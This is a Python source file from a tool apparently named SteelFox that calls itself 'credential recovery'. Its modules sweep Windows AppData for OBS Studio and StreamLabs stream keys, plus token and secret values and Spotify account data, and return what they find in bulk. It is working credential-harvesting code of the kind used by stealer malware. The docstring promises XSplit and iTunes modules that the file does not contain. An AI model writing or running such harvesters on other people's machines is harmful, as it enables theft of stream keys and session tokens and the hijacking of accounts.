# -*- coding: utf-8 -*-
"""
SteelFox — Multimedia & Streaming Credential Recovery

Recovers data from:
  - OBS Studio (stream keys for Twitch, YouTube, etc.)
  - StreamLabs OBS
  - XSplit
  - Spotify (session tokens)
  - iTunes / Apple Music (stored credentials)
"""

from __future__ import annotations

import json
import logging
import os
import re
import winreg
from pathlib import Path
from typing import Any

from steelfox.core.config import config
from steelfox.core.module_base import Category, ModuleBase, ModuleMeta

logger = logging.getLogger("steelfox")


def _resolve(template: str) -> str | None:
    try:
        result = template
        for k, v in config.profile.items():
            result = result.replace(f"{{{k}}}", v)
        return result
    except Exception:
        return None


# ═══════════════════════════════════════════════════════════════════════════
# OBS Studio — Stream Keys in Cleartext
# ═══════════════════════════════════════════════════════════════════════════

class OBSStudio(ModuleBase):
    """Recover OBS Studio stream keys — stored in cleartext in service.json and basic.ini."""

    meta = ModuleMeta(
        name="OBS Studio",
        category=Category.GAMING,
        description="Recover stream keys (Twitch, YouTube, Facebook, etc.) from OBS Studio",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        obs_dirs = [
            _resolve("{APPDATA}\\obs-studio"),
            _resolve("{APPDATA}\\obs-studio-hook"),
        ]

        for obs_dir_str in obs_dirs:
            if not obs_dir_str:
                continue
            obs_dir = Path(obs_dir_str)
            if not obs_dir.exists():
                continue

            # service.json — contains stream service + key
            service_file = obs_dir / "basic" / "profiles"
            if service_file.exists():
                for profile_dir in service_file.iterdir():
                    if not profile_dir.is_dir():
                        continue
                    svc = profile_dir / "service.json"
                    if svc.exists():
                        try:
                            data = json.loads(svc.read_text(encoding="utf-8", errors="replace"))
                            settings = data.get("settings", {})
                            stream_key = settings.get("key", "")
                            service_name = settings.get("service", data.get("type", ""))
                            server = settings.get("server", "")

                            if stream_key:
                                results.append({
                                    "Source": "OBS Studio",
                                    "Profile": profile_dir.name,
                                    "Service": service_name,
                                    "Stream Key": stream_key,
                                    "Server": server,
                                })
                        except Exception:
                            continue

                    # basic.ini can have stream_key as well
                    basic_ini = profile_dir / "basic.ini"
                    if basic_ini.exists():
                        try:
                            content = basic_ini.read_text(encoding="utf-8", errors="replace")
                            for line in content.splitlines():
                                if "key=" in line.lower() or "streamkey" in line.lower():
                                    results.append({
                                        "Source": "OBS Studio (basic.ini)",
                                        "Profile": profile_dir.name,
                                        "Setting": line.strip(),
                                    })
                        except Exception:
                            continue

            # Global config — can have API tokens
            global_ini = obs_dir / "global.ini"
            if global_ini.exists():
                try:
                    content = global_ini.read_text(encoding="utf-8", errors="replace")
                    for line in content.splitlines():
                        ll = line.lower()
                        if any(kw in ll for kw in ["token", "key", "auth", "secret"]):
                            results.append({
                                "Source": "OBS Studio (global.ini)",
                                "Setting": line.strip(),
                            })
                except Exception:
                    pass

        return results


# ═══════════════════════════════════════════════════════════════════════════
# StreamLabs Desktop (SLOBS)
# ═══════════════════════════════════════════════════════════════════════════

class StreamLabs(ModuleBase):
    """Recover StreamLabs OBS stream keys."""

    meta = ModuleMeta(
        name="StreamLabs",
        category=Category.GAMING,
        description="Recover stream keys from StreamLabs Desktop",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        slobs_dir = _resolve("{APPDATA}\\slobs-client")
        if not slobs_dir:
            return results

        base = Path(slobs_dir)
        if not base.exists():
            return results

        # service-state.json
        for svc_file in base.rglob("service-state*.json"):
            try:
                data = json.loads(svc_file.read_text(encoding="utf-8", errors="replace"))
                self._extract_nested_keys(data, str(svc_file), results)
            except Exception:
                continue

        # Basic config files
        for config_file in base.rglob("*.json"):
            try:
                content = config_file.read_text(encoding="utf-8", errors="replace")
                if any(kw in content.lower() for kw in ["stream_key", "streamkey", "\"key\""]):
                    data = json.loads(content)
                    self._extract_nested_keys(data, str(config_file), results)
            except Exception:
                continue

        return results

    def _extract_nested_keys(self, obj: Any, source: str, results: list[dict[str, Any]]) -> None:
        if isinstance(obj, dict):
            for k, v in obj.items():
                kl = k.lower()
                if ("key" in kl or "token" in kl or "secret" in kl) and isinstance(v, str) and len(v) > 6:
                    results.append({
                        "Source": "StreamLabs",
                        "File": source,
                        "Key": k,
                        "Value": v[:200],
                    })
                else:
                    self._extract_nested_keys(v, source, results)
        elif isinstance(obj, list):
            for item in obj:
                self._extract_nested_keys(item, source, results)


# ═══════════════════════════════════════════════════════════════════════════
# Spotify
# ═══════════════════════════════════════════════════════════════════════════

class Spotify(ModuleBase):
    """Recover Spotify session tokens and cached credentials."""

    meta = ModuleMeta(
        name="Spotify",
        category=Category.GAMING,
        description="Recover Spotify session tokens and cached login data",
    )

    def run(self) -> list[dict[str, Any]]:
        results: list[dict[str, Any]] = []

        spotify_dir = _resolve("{APPDATA}\\Spotify")
        if not spotify_dir:
            return results

        base = Path(spotify_dir)
        if not base.exists():
            return results

        # prefs file can contain username
        prefs = base / "prefs"
        if prefs.exists():
            try:
                content = prefs.read_text(encoding="utf-8", errors="replace")
                for line in content.splitlines():
                    if "autologin.username" in line or "login.username" in line:
                        results.append({
                            "Source": "Spotify",
                            "Setting": line.strip(),
                        })
            except Exception:
                pass

        # Users directory
        users_dir = base / "Users"
        if users_dir.exists():
            for user_dir in users_dir.iterdir():
                if user_dir.is_dir() and user_dir.name not in (".", ".."):
                    results.append({
                        "Source": "Spotify",
                        "Username": user_dir.name,
                    })

        # Local storage — can contain session tokens
        ls_dir = _resolve("{LOCALAPPDATA}\\Spotify\\Storage")
        if ls_dir:
            ls_path = Path(ls_dir)
            if ls_path.exists():
                for db_file in ls_path.rglob("*.db"):
                    results.append({
                        "Source": "Spotify",
                        "Type": "Local Storage DB",
                        "Path": str(db_file),
                    })

        return results
